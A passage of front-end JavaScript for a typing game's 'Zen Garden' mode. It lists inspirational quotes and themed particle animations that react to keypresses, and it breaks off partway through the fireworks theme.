        { text: "The most beautiful things in the world cannot be seen or even touched, they must be felt with the heart.", author: "Antoine de Saint-Exupery" },
        { text: "It is only with the heart that one can see rightly. What is essential is invisible to the eye.", author: "Antoine de Saint-Exupery" },
        { text: "If you want to build a ship, don't drum up the men to gather wood, divide the work, and give orders. Instead, teach them to yearn for the vast and endless sea.", author: "Antoine de Saint-Exupery" },
        { text: "A goal without a plan is just a wish.", author: "Antoine de Saint-Exupery" },
        { text: "You become responsible forever for what you have tamed.", author: "Antoine de Saint-Exupery" },
        { text: "What saves a man is to take a step. Then another step.", author: "Antoine de Saint-Exupery" },
        { text: "Grown-ups never understand anything by themselves, and it is tiresome for children to be always and forever explaining things to them.", author: "Antoine de Saint-Exupery" },
        { text: "What makes the desert beautiful is that somewhere it hides a well.", author: "Antoine de Saint-Exupery" },
        { text: "All grown-ups were once children, but only few of them remember it.", author: "Antoine de Saint-Exupery" },
        { text: "Words are a pretext. It is the inner bond that draws one person to another, not words.", author: "Rumi" },
        { text: "The only lasting beauty is the beauty of the heart.", author: "Rumi" },
        { text: "Be like a tree and let the dead leaves drop.", author: "Rumi" },
        { text: "Don't grieve. Anything you lose comes round in another form.", author: "Rumi" },
        { text: "Lovers don't finally meet somewhere. They're in each other all along.", author: "Rumi" },
        { text: "The soul has been given its own ears to hear things the mind does not understand.", author: "Rumi" },
        { text: "In your light I learn how to love. In your beauty, how to make poems.", author: "Rumi" },
        { text: "Love is the bridge between you and everything.", author: "Rumi" },
        { text: "Stop acting so small. You are the universe in ecstatic motion.", author: "Rumi" },
        { text: "Sell your cleverness and buy bewilderment.", author: "Rumi" },
        { text: "Ignore those that make you fearful and sad, that degrade you back towards disease and death.", author: "Rumi" },
        { text: "Why do you stay in prison when the door is so wide open?", author: "Rumi" },
        { text: "The minute I heard my first love story, I started looking for you.", author: "Rumi" },
        { text: "Set your life on fire. Seek those who fan your flames.", author: "Rumi" },
        { text: "Everything in the universe is within you. Ask all from yourself.", author: "Rumi" },
        { text: "My soul is from elsewhere, I'm sure of that, and I intend to end up there.", author: "Rumi" },
        { text: "Travel brings power and love back into your life.", author: "Rumi" },
        { text: "Run from what's comfortable. Forget safety. Live where you fear to live.", author: "Rumi" },
        { text: "Dance until you shatter yourself.", author: "Rumi" },
        { text: "Your heart knows the way. Run in that direction.", author: "Rumi" },
        { text: "What hurts you, blesses you. Darkness is your candle.", author: "Rumi" },
        { text: "I want to sing like the birds sing, not worrying about who hears or what they think.", author: "Rumi" },
        { text: "You think you are alive because you breathe air? Shame on you, that you are alive in such a limited way.", author: "Rumi" },
        { text: "Only from the heart can you touch the sky.", author: "Rumi" },
        { text: "Out beyond ideas of wrongdoing and rightdoing, there is a field. I will meet you there.", author: "Rumi" },
        { text: "When you do things from your soul, you feel a river moving in you, a joy.", author: "Rumi" },
        { text: "Take someone who doesn't keep score, who's not looking to be richer, or afraid of losing. Who has not the slightest interest even in his own personality. He's free.", author: "Rumi" },
        { text: "I belong to no religion. My religion is love. Every heart is my temple.", author: "Rumi" },
        { text: "Work on yourself. Every day. Until the day you die.", author: "Osho" },
        { text: "Experience life in all possible ways: good-bad, bitter-sweet, dark-light, summer-winter.", author: "Osho" },
        { text: "The real question is not whether life exists after death. The real question is whether you are alive before death.", author: "Osho" },
        { text: "Creativity is the greatest rebellion in existence.", author: "Osho" },
        { text: "If you love a flower, don't pick it up. Because if you pick it up it dies and it ceases to be what you love.", author: "Osho" },
        { text: "Be realistic. Plan for a miracle.", author: "Osho" },
        { text: "Sadness gives depth. Happiness gives height. Sadness gives roots. Happiness gives branches.", author: "Osho" },
        { text: "A certain darkness is needed to see the stars.", author: "Osho" },
        { text: "Don't seek, don't search, don't ask, don't knock, don't demand — relax.", author: "Osho" },
        { text: "I am the wisest man alive, for I know one thing, and that is that I know nothing.", author: "Socrates" },
        { text: "The secret of change is to focus all of your energy not on fighting the old, but on building the new.", author: "Socrates" },
        { text: "Educating the mind without educating the heart is no education at all.", author: "Aristotle" },
        { text: "Happiness depends upon ourselves.", author: "Aristotle" },
        { text: "It is the mark of an educated mind to be able to entertain a thought without accepting it.", author: "Aristotle" },
        { text: "The whole is greater than the sum of its parts.", author: "Aristotle" },
        { text: "What is a friend? A single soul dwelling in two bodies.", author: "Aristotle" },
        { text: "Patience is bitter, but its fruit is sweet.", author: "Aristotle" },
        { text: "Pleasure in the job puts perfection in the work.", author: "Aristotle" },
        { text: "I count him braver who overcomes his desires than him who conquers his enemies.", author: "Aristotle" },
        { text: "The roots of education are bitter, but the fruit is sweet.", author: "Aristotle" },
        { text: "A friend to all is a friend to none.", author: "Aristotle" },
        { text: "Hope is a waking dream.", author: "Aristotle" },
        { text: "It is not enough to win a war. It is more important to organize the peace.", author: "Aristotle" },
        { text: "The more you know, the more you realize you don't know.", author: "Aristotle" },
        { text: "He is no fool who gives what he cannot keep to gain what he cannot lose.", author: "Jim Elliot" },
        { text: "I've learned that people will forget what you said, people will forget what you did, but people will never forget how you made them feel.", author: "Maya Angelou" },
        { text: "Anyone who lives within their means suffers from a lack of imagination.", author: "Oscar Wilde" },
        { text: "I have nothing to declare except my genius.", author: "Oscar Wilde" },
        { text: "We are all in the gutter, but some of us are looking at the stars.", author: "Oscar Wilde" },
        { text: "A cynic is a man who knows the price of everything and the value of nothing.", author: "Oscar Wilde" },
        { text: "To define is to limit.", author: "Oscar Wilde" },
        { text: "The truth is rarely pure and never simple.", author: "Oscar Wilde" },
        { text: "I can resist everything except temptation.", author: "Oscar Wilde" },
        { text: "Man is least himself when he talks in his own person. Give him a mask, and he will tell you the truth.", author: "Oscar Wilde" },
        { text: "Experience is simply the name we give our mistakes.", author: "Oscar Wilde" },
        { text: "Conformity is the jailer of freedom and the enemy of growth.", author: "John F. Kennedy" },
        { text: "Those who dare to fail miserably can achieve greatly.", author: "John F. Kennedy" },
        { text: "Ask not what your country can do for you — ask what you can do for your country.", author: "John F. Kennedy" },
        { text: "Efforts and courage are not enough without purpose and direction.", author: "John F. Kennedy" },
        { text: "Change is the law of life. And those who look only to the past or present are certain to miss the future.", author: "John F. Kennedy" },
        { text: "Things do not happen. Things are made to happen.", author: "John F. Kennedy" },
        { text: "A man may die, nations may rise and fall, but an idea lives on.", author: "John F. Kennedy" },
        { text: "We choose to go to the moon not because it is easy, but because it is hard.", author: "John F. Kennedy" },
        { text: "The greatest enemy of knowledge is not ignorance, it is the illusion of knowledge.", author: "Daniel J. Boorstin" },
        { text: "Not until we are lost do we begin to understand ourselves.", author: "Henry David Thoreau" },
        { text: "The cost of a thing is the amount of life which is required to be exchanged for it.", author: "Henry David Thoreau" },
        { text: "Rather than love, than money, than fame, give me truth.", author: "Henry David Thoreau" },
        { text: "All good things are wild and free.", author: "Henry David Thoreau" },
        { text: "Things do not change; we change.", author: "Henry David Thoreau" },
        { text: "Disobedience is the true foundation of liberty.", author: "Henry David Thoreau" },
        { text: "How vain it is to sit down to write when you have not stood up to live.", author: "Henry David Thoreau" },
        { text: "Success usually comes to those who are too busy to be looking for it.", author: "Henry David Thoreau" },
        { text: "The price of anything is the amount of life you exchange for it.", author: "Henry David Thoreau" },
        { text: "It's not what you look at that matters, it's what you see.", author: "Henry David Thoreau" },
        { text: "If a man does not keep pace with his companions, perhaps it is because he hears a different drummer.", author: "Henry David Thoreau" },
        { text: "As a single footstep will not make a path on the earth, so a single thought will not make a pathway in the mind.", author: "Henry David Thoreau" },
        { text: "Dreams are the touchstones of our character.", author: "Henry David Thoreau" },
        { text: "Happiness is like a butterfly, the more you chase it, the more it will elude you.", author: "Henry David Thoreau" },
        { text: "I know of no more encouraging fact than the unquestionable ability of man to elevate his life by a conscious endeavor.", author: "Henry David Thoreau" },
        { text: "A man is rich in proportion to the number of things he can afford to let alone.", author: "Henry David Thoreau" },
        { text: "What you get by achieving your goals is not as important as what you become by achieving your goals.", author: "Zig Ziglar" },
        { text: "You were born to win, but to be a winner, you must plan to win, prepare to win, and expect to win.", author: "Zig Ziglar" },
        { text: "You don't have to be great to start, but you have to start to be great.", author: "Zig Ziglar" },
        { text: "Lack of direction, not lack of time, is the problem. We all have twenty-four hour days.", author: "Zig Ziglar" },
        { text: "Your attitude, not your aptitude, will determine your altitude.", author: "Zig Ziglar" },
        { text: "When obstacles arise, you change your direction to reach your goal. You do not change your decision to get there.", author: "Zig Ziglar" },
        { text: "You don't build a business. You build people, and people build the business.", author: "Zig Ziglar" },
        { text: "If you can dream it, you can achieve it.", author: "Zig Ziglar" },
        { text: "The chief danger in life is that you may take too many precautions.", author: "Alfred Adler" },
        { text: "Everything can be taken from a man but one thing — the freedom to choose his attitude in any given set of circumstances.", author: "Viktor Frankl" },
        { text: "Those who have a why to live can bear with almost any how.", author: "Viktor Frankl" },
        { text: "The last of human freedoms — the ability to choose one's attitude in a given set of circumstances.", author: "Viktor Frankl" },
        { text: "What is to give light must endure burning.", author: "Viktor Frankl" },
        { text: "An abnormal reaction to an abnormal situation is normal behavior.", author: "Viktor Frankl" },
        { text: "Live as if you were living already for the second time.", author: "Viktor Frankl" },
        { text: "Challenging the meaning of life is the truest expression of the state of being human.", author: "Viktor Frankl" },
        { text: "For success, attitude is equally as important as ability.", author: "Walter Scott" },
        { text: "There is nothing permanent except change.", author: "Heraclitus" },
        { text: "No man ever steps in the same river twice, for it is not the same river and he is not the same man.", author: "Heraclitus" },
        { text: "Character is destiny.", author: "Heraclitus" },
        { text: "The soul is dyed the color of its thoughts.", author: "Heraclitus" },
        { text: "Big jobs usually go to the men who prove their ability to outgrow small ones.", author: "Ralph Waldo Emerson" },
        { text: "Life is a journey, not a destination.", author: "Ralph Waldo Emerson" },
        { text: "What lies behind us and what lies ahead of us are tiny matters compared to what lives within us.", author: "Ralph Waldo Emerson" },
        { text: "For every minute you are angry you lose sixty seconds of happiness.", author: "Ralph Waldo Emerson" },
        { text: "To be great is to be misunderstood.", author: "Ralph Waldo Emerson" },
        { text: "Dare to live the life you have dreamed for yourself. Go forward and make your dreams come true.", author: "Ralph Waldo Emerson" },
        { text: "The earth laughs in flowers.", author: "Ralph Waldo Emerson" },
        { text: "It is not the length of life, but the depth.", author: "Ralph Waldo Emerson" },
        { text: "Every wall is a door.", author: "Ralph Waldo Emerson" },
        { text: "Always do what you are afraid to do.", author: "Ralph Waldo Emerson" },
        { text: "A hero is no braver than an ordinary man, but he is brave five minutes longer.", author: "Ralph Waldo Emerson" },
        { text: "All I have seen teaches me to trust the Creator for all I have not seen.", author: "Ralph Waldo Emerson" },
        { text: "Write it on your heart that every day is the best day in the year.", author: "Ralph Waldo Emerson" },
        { text: "What we fear doing most is usually what we most need to do.", author: "Tim Ferriss" },
        { text: "Focus on being productive instead of busy.", author: "Tim Ferriss" },
        { text: "A person's success in life can usually be measured by the number of uncomfortable conversations he or she is willing to have.", author: "Tim Ferriss" },
        { text: "If you let your learning lead to knowledge, you become a fool. If you let your learning lead to action, you become wealthy.", author: "Jim Rohn" },
        { text: "Either you run the day, or the day runs you.", author: "Jim Rohn" },
        { text: "If you are not willing to risk the usual, you will have to settle for the ordinary.", author: "Jim Rohn" },
        { text: "Discipline is the bridge between goals and accomplishment.", author: "Jim Rohn" },
        { text: "Formal education will make you a living. Self-education will make you a fortune.", author: "Jim Rohn" },
        { text: "You are the average of the five people you spend the most time with.", author: "Jim Rohn" },
        { text: "Don't wish it were easier. Wish you were better.", author: "Jim Rohn" },
        { text: "Take care of your body. It's the only place you have to live.", author: "Jim Rohn" },
        { text: "Success is nothing more than a few simple disciplines, practiced every day.", author: "Jim Rohn" },
        { text: "We must all suffer one of two things: the pain of discipline or the pain of regret.", author: "Jim Rohn" },
        { text: "Motivation is what gets you started. Habit is what keeps you going.", author: "Jim Rohn" },
        { text: "The only person you should try to be better than is the person you were yesterday.", author: "Unknown" },
        { text: "The best view comes after the hardest climb.", author: "Unknown" },
        { text: "Be so good they can't ignore you.", author: "Steve Martin" },
        { text: "Hard choices, easy life. Easy choices, hard life.", author: "Jerzy Gregorek" },
        { text: "Make each day your masterpiece.", author: "John Wooden" },
        { text: "Don't let what you cannot do interfere with what you can do.", author: "John Wooden" },
        { text: "It's what you learn after you know it all that counts.", author: "John Wooden" },
        { text: "Talent is God given. Be humble. Fame is man-given. Be grateful. Conceit is self-given. Be careful.", author: "John Wooden" },
        { text: "Success is peace of mind, which is a direct result of self-satisfaction in knowing you did your best.", author: "John Wooden" },
        { text: "The most important thing is to try and inspire people so that they can be great in whatever they want to do.", author: "Kobe Bryant" },
        { text: "Everything negative — pressure, challenges — is all an opportunity for me to rise.", author: "Kobe Bryant" },
        { text: "I can't relate to lazy people. We don't speak the same language. I don't understand you. I don't want to understand you.", author: "Kobe Bryant" },
        { text: "Job finished? I don't think so.", author: "Kobe Bryant" },
        { text: "If you're afraid to fail, then you're probably going to fail.", author: "Kobe Bryant" },
        { text: "The moment you give up is the moment you let someone else win.", author: "Kobe Bryant" },
        { text: "Haters are a good problem to have. Nobody hates the good ones. They hate the great ones.", author: "Kobe Bryant" },
        { text: "I'll do whatever it takes to win games, whether it's sitting on a bench waving a towel or hitting the game-winning shot.", author: "Kobe Bryant" },
        { text: "My brain cannot process failure. It will not process failure.", author: "Kobe Bryant" },
        { text: "Rest at the end, not in the middle.", author: "Kobe Bryant" },
        { text: "I don't want to be the next Michael Jordan, I only want to be Kobe Bryant.", author: "Kobe Bryant" },
        { text: "Some people want it to happen, some wish it would happen, others make it happen.", author: "Michael Jordan" },
        { text: "I've missed more than nine thousand shots in my career. I've lost almost three hundred games. I've failed over and over and over again in my life. And that is why I succeed.", author: "Michael Jordan" },
        { text: "I play to win, whether during practice or a real game.", author: "Michael Jordan" },
        { text: "My attitude is that if you push me towards something that you think is a weakness, then I will turn that perceived weakness into a strength.", author: "Michael Jordan" },
        { text: "If you quit once it becomes a habit. Never quit.", author: "Michael Jordan" },
        { text: "Obstacles don't have to stop you. If you run into a wall, don't turn around and give up. Figure out how to climb it.", author: "Michael Jordan" },
        { text: "Champions do not become champions when they win the event, but in the hours, weeks, months, and years they spend preparing for it.", author: "T. Alan Armstrong" },
        { text: "The only impossible journey is the one you never begin.", author: "Tony Robbins" },
        { text: "Setting goals is the first step in turning the invisible into the visible.", author: "Tony Robbins" },
        { text: "It is in your moments of decision that your destiny is shaped.", author: "Tony Robbins" },
        { text: "Stay committed to your decisions, but stay flexible in your approach.", author: "Tony Robbins" },
        { text: "The path to success is to take massive, determined action.", author: "Tony Robbins" },
        { text: "Where focus goes, energy flows.", author: "Tony Robbins" },
        { text: "The quality of your life is the quality of your relationships.", author: "Tony Robbins" },
        { text: "Trade your expectations for appreciation and the world changes instantly.", author: "Tony Robbins" },
        { text: "It is what it is. But it will become what you make it.", author: "Pat Summit" },
        { text: "Nobody cares how much you know until they know how much you care.", author: "Theodore Roosevelt" },
        { text: "In any moment of decision, the best thing you can do is the right thing. The worst thing you can do is nothing.", author: "Theodore Roosevelt" },
        { text: "Comparison is the thief of joy.", author: "Theodore Roosevelt" },
        { text: "Speak softly and carry a big stick.", author: "Theodore Roosevelt" },
        { text: "Keep your eyes on the stars, and your feet on the ground.", author: "Theodore Roosevelt" },
        { text: "The credit belongs to the man who is actually in the arena.", author: "Theodore Roosevelt" },
        { text: "Knowing what must be done does away with fear.", author: "Rosa Parks" },
        { text: "Each person must live their life as a model for others.", author: "Rosa Parks" }
    ];

    let zenState = {
        active: false,
        startTime: null,
        timerInterval: null,
        contentIndex: 0,
        shuffled: [],
        theme: localStorage.getItem('zenGardenTheme') || 'autumn-drift',
        _escHandler: null,
        _typeHandler: null
    };

    function launchZenGarden() {
        zenState.active = true;
        zenState.startTime = null;
        codingState.mode = 'zen';
        codingState.charIndex = 0;
        codingState.correct = 0;
        codingState.total = 0;
        codingState.startTime = null;

        // Shuffle content
        zenState.shuffled = [...zenGardenContent].sort(() => Math.random() - 0.5);
        zenState.contentIndex = 0;

        showCodingScreen('coding-zen-board');
        loadNextZenQuote();

        // Ensure board has correct theme class
        const board = document.getElementById('coding-zen-board');
        if (board) {
            board.className = 'coding-screen theme-' + zenState.theme;
        }

        // Setup Theme Toggle Menu
        const themeToggle = document.getElementById('zen-theme-toggle');
        const themeMenu = document.getElementById('zen-theme-menu');

        if (themeToggle && themeMenu) {
            themeToggle.onclick = (e) => {
                e.stopPropagation();
                themeMenu.classList.toggle('open');
            };

            // Close menu if clicking outside
            document.addEventListener('click', (e) => {
                if (!e.target.closest('#zen-theme-wrapper')) {
                    themeMenu.classList.remove('open');
                }
            }, { once: true }); // Attach once per launch, relies on exit cleanup if needed, but safe enough here
        }

        const themeBtns = document.querySelectorAll('.zen-theme-btn');
        // Sync active highlight with stored theme
        themeBtns.forEach(b => b.classList.remove('active'));
        const activeBtn = document.querySelector(`.zen-theme-btn[data-theme="${zenState.theme}"]`);
        if (activeBtn) activeBtn.classList.add('active');

        themeBtns.forEach(btn => {
            btn.onclick = (e) => {
                e.stopPropagation();
                themeBtns.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                zenState.theme = btn.dataset.theme;
                localStorage.setItem('zenGardenTheme', zenState.theme);

                if (board) board.className = 'coding-screen theme-' + zenState.theme;
                startZenParticles();

                if (themeMenu) themeMenu.classList.remove('open');
            };
        });

        startZenParticles();
        startZenTimer();

        // Type Physics for Particles
        if (zenState._typeHandler) document.removeEventListener('keydown', zenState._typeHandler);
        zenState._typeHandler = function (e) {
            if (!zenState.active) return;
            // Only react to standard typed characters
            if (e.key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
                const theme = zenState.theme;

                if (theme === 'autumn-drift' || theme === 'sakura-blossom' || theme === 'midnight-snow') {
                    const selector = theme === 'autumn-drift' ? '.zen-leaf' :
                        theme === 'sakura-blossom' ? '.zen-sakura' : '.zen-snow';
                    const force = theme === 'midnight-snow' ? 5 : theme === 'sakura-blossom' ? 15 : 25;
                    document.querySelectorAll(selector).forEach(p => {
                        const currentTx = parseFloat(p.dataset.tx || 0);
                        const newTx = currentTx + (force + Math.random() * force);
                        p.dataset.tx = newTx;
                        p.style.transform = `translateX(${newTx}px) rotate(${Math.random() * 180}deg)`;
                    });
                } else if (theme === 'desert-sand') {
                    document.querySelectorAll('.zen-sand').forEach(p => {
                        const currentTx = parseFloat(p.dataset.tx || 0);
                        let newTx = currentTx + (40 + Math.random() * 40);
                        if (newTx > window.innerWidth + 50) {
                            // Wrap back to left edge — instant snap, no visible slide back
                            newTx = -(50 + Math.random() * 100);
                            p.style.transition = 'none';
                        } else {
                            p.style.transition = 'transform 0.6s ease-out';
                        }
                        p.dataset.tx = newTx;
                        p.style.transform = `translateX(${newTx}px)`;
                    });
                } else if (theme === 'abyssal-depths' || theme === 'ember-glow') {
                    const selector = theme === 'abyssal-depths' ? '.zen-bubble' : '.zen-ember';
                    const force = theme === 'ember-glow' ? 30 : 15;
                    document.querySelectorAll(selector).forEach(p => {
                        const currentTy = parseFloat(p.dataset.ty || 0);
                        const newTy = currentTy - (force + Math.random() * force);
                        p.dataset.ty = newTy;
                        p.style.transition = 'transform 1.2s ease-out';
                        p.style.transform = `translateY(${newTy}px)`;
                    });
                } else if (theme === 'synthwave-grid' || theme === 'quantum-float') {
                    const selector = theme === 'synthwave-grid' ? '.zen-synth' : '.zen-quantum';
                    document.querySelectorAll(selector).forEach(p => {
                        const currentRot = parseFloat(p.dataset.rot || 0);
                        const newRot = currentRot + 45;
                        p.dataset.rot = newRot;
                        p.style.transform = `rotate(${newRot}deg) scale(1.2)`;
                        setTimeout(() => p.style.transform = `rotate(${newRot}deg) scale(1)`, 200);
                    });
                } else if (theme === 'fireflies' || theme === 'golden-hour' || theme === 'stardust') {
                    const selector = theme === 'fireflies' ? '.zen-firefly' : theme === 'golden-hour' ? '.zen-gold-dust' : '.zen-star';
                    document.querySelectorAll(selector).forEach(p => {
                        if (Math.random() > 0.5) {
                            p.style.transform = `scale(1.5)`;
                            p.style.opacity = '1';
                            setTimeout(() => {
                                p.style.transform = 'scale(1)';
                                p.style.opacity = '';
                            }, 300);
                        }
                    });
                } else if (theme === 'neon-rain') {
                    // Surge: randomly brighten a subset of streaks
                    document.querySelectorAll('.zen-neon-streak').forEach(p => {
                        if (Math.random() > 0.4) {
                            p.style.opacity = '1';
                            p.style.transition = 'opacity 0.1s';
                            setTimeout(() => { p.style.opacity = '0.6'; p.style.transition = 'opacity 0.6s'; }, 120);
                        }
                    });
                } else if (theme === 'coral-reef') {
                    // Pop: scale up and glow brighter on key
                    document.querySelectorAll('.zen-coral').forEach(p => {
                        if (Math.random() > 0.5) {
                            p.style.transition = 'transform 0.15s ease-out';
                            p.style.transform = `scale(1.6)`;
                            setTimeout(() => { p.style.transform = 'scale(1)'; p.style.transition = 'transform 0.5s ease-in'; }, 180);
                        }
                    });
                } else if (theme === 'aurora-borealis') {
                    // Ripple: push aurora ribbons sideways
                    document.querySelectorAll('.zen-aurora').forEach(p => {
                        const currentTx = parseFloat(p.dataset.tx || 0);
                        const shift = (Math.random() - 0.5) * 60;
                        const newTx = currentTx + shift;
                        p.dataset.tx = newTx;
                        p.style.transition = 'transform 1.5s ease-out';
                        p.style.transform = `translateX(${newTx}px) scaleY(${0.9 + Math.random() * 0.4})`;
                    });
                } else if (theme === 'lava-drip') {
                    // Splatter: random subset jolts sideways then back
                    document.querySelectorAll('.zen-lava').forEach(p => {
                        if (Math.random() > 0.5) {
                            const jolt = (Math.random() - 0.5) * 30;
                            p.style.transition = 'transform 0.1s ease-out';
                            p.style.transform = `translateX(${jolt}px) scaleY(1.3)`;
                            setTimeout(() => { p.style.transform = ''; p.style.transition = 'transform 0.4s ease-in'; }, 150);
                        }
                    });
                } else if (theme === 'void-whisper') {
                    document.querySelectorAll('.zen-void').forEach(p => {
                        p.style.transition = 'transform 0.2s ease-in, opacity 0.2s';
                        p.style.transform = 'scale(0.3)';
                        p.style.opacity = '0.8';
                        setTimeout(() => {
                            p.style.transition = 'transform 0.8s cubic-bezier(0.2,1.5,0.5,1), opacity 0.6s';
                            p.style.transform = 'scale(1.8)';
                            p.style.opacity = '0.2';
                        }, 200);
                    });
                } else if (theme === 'crystal-cave') {
                    // Scatter: shards spin and flash bright
                    document.querySelectorAll('.zen-crystal').forEach(p => {
                        if (Math.random() > 0.4) {
                            const spin = (Math.random() - 0.5) * 60;
                            p.style.transition = 'transform 0.15s ease-out, filter 0.15s';
                            p.style.transform = `rotate(${spin}deg) scale(1.5)`;
                            p.style.filter = 'brightness(3) saturate(2)';
                            setTimeout(() => {
                                p.style.transform = '';
                                p.style.filter = '';
                                p.style.transition = 'transform 0.8s ease-out, filter 0.8s';
                            }, 150);
                        }
                    });
                } else if (theme === 'monsoon') {
                    // Lightning: brief full-screen flash — cooldown-gated so it feels like real storm lightning
                    let flash = document.querySelector('.zen-lightning-flash');
                    if (!flash) {
                        flash = document.createElement('div');
                        flash.className = 'zen-lightning-flash';
                        document.getElementById('coding-zen-board').appendChild(flash);
                    }
                    const now = Date.now();
                    const lastStrike = parseFloat(flash.dataset.lastStrike || 0);
                    // Min 5s gap, randomized up to 12s so strikes don't feel mechanical
                    const cooldown = 5000 + Math.random() * 7000;
                    if ((now - lastStrike > cooldown) && Math.random() > 0.8) {
                        flash.dataset.lastStrike = now;
                        // Double-flash: real lightning rarely strikes just once
                        flash.style.opacity = '1';
                        setTimeout(() => { flash.style.opacity = '0'; }, 70);
                        setTimeout(() => { flash.style.opacity = '0.7'; }, 110);
                        setTimeout(() => { flash.style.opacity = '0'; }, 190);
                    }
                    // Also speed up all drops briefly
                    document.querySelectorAll('.zen-monsoon-drop').forEach(p => {
                        if (Math.random() > 0.5) {
                            p.style.animationDuration = (0.15 + Math.random() * 0.2) + 's';
                        }
                    });
                } else if (theme === 'bioluminescence') {
                    // Burst: random orbs flare bright
                    document.querySelectorAll('.zen-bio').forEach(p => {
                        if (Math.random() > 0.5) {
                            p.style.transition = 'box-shadow 0.1s, opacity 0.1s';
                            p.style.boxShadow = '0 0 40px rgba(0,255,160,0.9), 0 0 80px rgba(0,200,255,0.5)';
                            p.style.opacity = '1';
                            setTimeout(() => {
                                p.style.boxShadow = '';
                                p.style.opacity = '';
                                p.style.transition = 'box-shadow 1s, opacity 1s';
                            }, 200);
                        }
                    });
                } else if (theme === 'galactic-drift') {
                    // Supernova: random nebula expands fast then fades
                    document.querySelectorAll('.zen-nebula').forEach(p => {
                        if (Math.random() > 0.6) {
                            p.style.transition = 'transform 0.3s ease-out, opacity 0.3s';
                            p.style.transform = 'scale(2.5)';
                            p.style.opacity = '0.6';
                            setTimeout(() => {
                                p.style.transform = 'scale(1)';
                                p.style.opacity = '0.15';
                                p.style.transition = 'transform 1.5s ease-in, opacity 1.5s';
                            }, 300);
                        }
                    });
                } else if (theme === 'ink-drop') {
                    // Spawn a fresh ink bloom at a random position on each keypress
                    const container = document.getElementById('zen-particles');
                    if (container) {
                        const drop = document.createElement('div');
                        drop.className = 'zen-ink';
                        const isz = 20 + Math.random() * 60;
                        drop.style.width = isz + 'px';
                        drop.style.height = isz + 'px';
                        drop.style.top = (10 + Math.random() * 80) + '%';
                        drop.style.left = (5 + Math.random() * 90) + '%';
                        drop.style.background = `radial-gradient(circle, rgba(${Math.floor(Math.random() * 40)},${Math.floor(Math.random() * 40)},${Math.floor(40 + Math.random() * 60)},0.9) 0%, transparent 70%)`;
                        drop.style.animationDuration = (1 + Math.random() * 1.5) + 's';
                        container.appendChild(drop);
                        setTimeout(() => drop.remove(), 3000);
                    }
                } else if (theme === 'candlelight') {
                    // Gust: randomly extinguish & re-ignite flames
                    document.querySelectorAll('.zen-candle-flame').forEach(p => {
                        if (Math.random() > 0.5) {
                            p.style.transition = 'transform 0.1s, opacity 0.1s';
                            p.style.transform = `skewX(${(Math.random() - 0.5) * 30}deg) scaleY(${0.3 + Math.random() * 0.5})`;
                            p.style.opacity = (0.1 + Math.random() * 0.4).toString();
                            setTimeout(() => {
                                p.style.transform = '';
                                p.style.opacity = '';
                                p.style.transition = 'transform 0.5s ease-out, opacity 0.5s';
                            }, 100 + Math.random() * 200);
                        }
                    });
                } else if (theme === 'tesla-coil') {
                    // Chain discharge: burst of new sparks on every keypress
                    const tcContainer = document.getElementById('zen-particles');
                    if (tcContainer) {
                        const burstCount = 1 + Math.floor(Math.random() * 3);
                        for (let b = 0; b < burstCount; b++) {
                            const sp = document.createElement('div');
                            sp.className = 'zen-spark';
                            const ssz = 2 + Math.random() * 6;
                            const angle = Math.random() * Math.PI * 2;
                            const dist = 60 + Math.random() * 200;
                            sp.style.width = ssz + 'px';
                            sp.style.height = ssz + 'px';
                            sp.style.top = (45 + Math.random() * 10) + '%';
                            sp.style.left = (45 + Math.random() * 10) + '%';
                            sp.style.background = Math.random() > 0.5 ? 'rgba(120,200,255,0.9)' : 'rgba(255,255,255,1)';
                            sp.style.boxShadow = '0 0 8px rgba(120,200,255,0.9)';
                            sp.style.setProperty('--sx', (Math.cos(angle) * dist) + 'px');
                            sp.style.setProperty('--sy', (Math.sin(angle) * dist) + 'px');
                            sp.style.animationDuration = (0.3 + Math.random() * 0.8) + 's';
                            tcContainer.appendChild(sp);
                            setTimeout(() => sp.remove(), 1200);
                        }
                    }
                } else if (theme === 'deep-current') {
                    // Surge: push all currents sideways briefly
                    document.querySelectorAll('.zen-current').forEach(p => {
                        const surge = 30 + Math.random() * 50;
                        p.style.transition = 'transform 0.4s ease-out';
                        p.style.transform = `translateX(${surge}px) scale(1.3)`;
                        setTimeout(() => {
                            p.style.transform = '';
                            p.style.transition = 'transform 1.5s ease-in';
                        }, 400);
                    });
                } else if (theme === 'mushroom-spores') {
                    // Puff: burst of extra spores
                    const msContainer = document.getElementById('zen-particles');
                    if (msContainer) {
                        const puffCount = 4 + Math.floor(Math.random() * 6);
                        for (let b = 0; b < puffCount; b++) {
                            const sp = document.createElement('div');
                            sp.className = 'zen-spore';
                            const msz = 4 + Math.random() * 8;
                            sp.style.width = msz + 'px';
                            sp.style.height = msz + 'px';
                            sp.style.left = (5 + Math.random() * 90) + '%';
                            sp.style.background = `rgba(180,255,${Math.floor(80 + Math.random() * 120)},0.8)`;
                            sp.style.boxShadow = `0 0 ${msz * 2}px rgba(180,255,120,0.6)`;
                            sp.style.animationDuration = `${2 + Math.random() * 3}s, ${1 + Math.random()}s`;
                            msContainer.appendChild(sp);
                            setTimeout(() => sp.remove(), 5000);
                        }
                    }
                } else if (theme === 'saturn-ring') {
                    // Tilt: dramatically change ring inclination on keypress
                    document.querySelectorAll('.zen-ring-particle').forEach(p => {
                        const tiltDeg = 60 + Math.random() * 30;
                        const ro = p.style.getPropertyValue('--ro') || '120px';
                        p.style.transition = 'transform 0.5s cubic-bezier(0.2, 1.5, 0.5, 1)';
                        p.style.transform = `rotateX(${tiltDeg}deg) rotateZ(${Math.random() * 360}deg) translateX(${ro})`;
                        setTimeout(() => {
                            p.style.transform = '';
                            p.style.transition = 'transform 1s ease-out';
                        }, 500);
                    });
                } else if (theme === 'meteor-shower') {
                    // Constant slow speed, subtle flash on keypress
                    document.querySelectorAll('.zen-meteor').forEach(p => {
                        if (Math.random() > 0.6) {
                            p.style.transition = 'filter 0.1s';
                            p.style.filter = 'brightness(2.5)';
                            setTimeout(() => { p.style.filter = ''; p.style.transition = 'filter 0.4s'; }, 100);
                        }
                    });
                } else if (theme === 'blood-moon') {
                    // Drip surge: accelerate and redden all drops
                    document.querySelectorAll('.zen-blood-drop').forEach(p => {
                        if (Math.random() > 0.4) {
                            p.style.transition = 'filter 0.1s';
                            p.style.filter = 'brightness(2) saturate(2)';
                            p.style.animationDuration = (0.8 + Math.random() * 1) + 's';
                            setTimeout(() => { p.style.filter = ''; p.style.transition = 'filter 0.5s'; }, 200);
                        }
                    });
                } else if (theme === 'fireworks') {
